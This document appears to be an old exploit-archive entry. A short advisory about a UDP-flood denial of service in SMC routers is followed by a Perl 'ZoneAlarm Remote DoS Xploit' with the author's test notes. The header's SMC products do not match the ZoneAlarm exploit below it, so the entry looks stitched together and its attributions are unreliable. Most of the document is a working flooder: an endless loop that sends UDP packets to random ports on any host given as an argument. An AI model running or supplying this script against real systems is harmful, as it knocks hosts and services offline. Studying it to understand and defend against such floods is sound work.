source: http://www.securityfocus.com/bid/8711/info

A denial of service has been reported in the SMC SMC2404WBR BarricadeT Turbo 11/22 Mbps Wireless Cable/DSL Broadband Router. It is possible to trigger this condition by sending UDP packets randomly to ports 0-65000.

The SMC7004VWBR router is also affected by this vulnerability. 

# Overview :
#
# ZoneAlarm is a firewall software
# package designed for Microsoft Windows
# operating systems that blocks intrusion
# attempts, trusted by millions, and has
# advanced privacy features like worms,
# Trojan horses, and spyware protection.
# ZoneAlarm is distributed and maintained
# by Zone Labs.http://www.zonelabs.com
#
# Details :
#
# ZoneAlarm was found vulnerable to a
# serious vulnerability leading to a
# remote Denial Of Service condition due
# to failure to handle udp random
# packets, if an attacker sends multiple
# udp packets to multiple ports 0-65000,
# the machine will hang up until the
# attacker stop flooding.
#
# The following is a remote test done
# under ZoneAlarm version 3.7.202 running
# on windows xp home edition.
#
# on irc test1 joined running ZoneAlarm
# version 3.7.202 with default
# installation
#
# * test1 (test@62.251.***.**) has joined #Hackology
#
# from a linux box :
#
# [root@mail DoS]# ping 62.251.***.**
# PING 62.251.***.** (62.251.***.**) from
# ***.***.**.** : 56(84) bytes of data.
#
# --- 62.251.***.** ping statistics ---
# 7 packets transmitted, 0 received, 100%
# loss, time 6017ms
#
# on irc
#
# -> [test1] PING
#
# [test1 PING reply]: 1secs
#
# Host is firewalled and up
#
# now lets try to dos
#
# --- ZoneAlarm Remote DoS Xploit
# ---
# --- Discovered & Coded By _6mO_HaCk
#
# [*] DoSing 62.251.***.** ... wait 1
# minute and then CTRL+C to stop
#
# [root@mail DoS]#
#
# after 2 minutes
#
# * test1 (test@62.251.***.**) Quit (Ping timeout)
#
# I have made the same test on ZoneAlarm
# Pro 4.0 Release running on windows xp
# professional and i've got the same
# result.
#
# Exploit released : 02/09/03
#
# Vulnerable Versions : ALL
#
# Operating Systems : ALL Windows
#
# Successfully Tested on :
#
# ZoneAlarm version 3.7.202 / windows xp
# home edition / windows 98.
#
# ZoneAlarm Pro 4.0 Release / windows xp
# professional
#
# Vendor status : UNKOWN
#
# Solution : Shut down ZoneAlarm and wait
# for an update.
#
# The following is a simple code written
# in perl to demonstrate that, the code
# is clean, it wont eat your cpu usage
# and it doesnt need to be run as root
# but you still have to use it at your
# own risk and on your own machine or
# remotly after you get permission.
#
# Big thanx go to D|NOOO and frost for
# providing me windows boxes with
# zonealarm for testing
#
# Greetz to ir7ioli, BlooDMASK
# Abderrahman@zone-h.org
# NRGY, Le_Ro| JT ghosted_ Securma,
# anasoft SySiPh, phrack, DeV|L0Ty,
# MajNouN |BiG-LuV| h4ckg1rl and all
# my ppl here in Chicago and in Morocco
#
# Comments suggestions or additional info
# feel free to contact me at
# simo@benyoussef.org
# _6mO_HaCk@linuxmail.org

#!/usr/bin/perl
use Socket;

system(clear);
print "\n";
print "--- ZoneAlarm Remote DoS Xploit\n";
print "---\n";
print "--- Discovered & Coded By _6mO_HaCk\n";
print "\n";
if(!defined($ARGV[0]))
{
   &usage
}

my ($target);
 $target=$ARGV[0];

my $ia       = inet_aton($target) 	   || die ("[-] Unable to resolve
$target");

socket(DoS, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$target");

print "[*] DoSing $target ... wait 1 minute and then CTRL+C to stop\n";

for (;;) {
 $size=$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand;
 $port=int(rand 65000) +1;
 send(DoS, 0, $size, sockaddr_in($port, $iaddr));
}
sub usage {die("\n\n[*] Usage : perl $0 <Target>\n\n");}


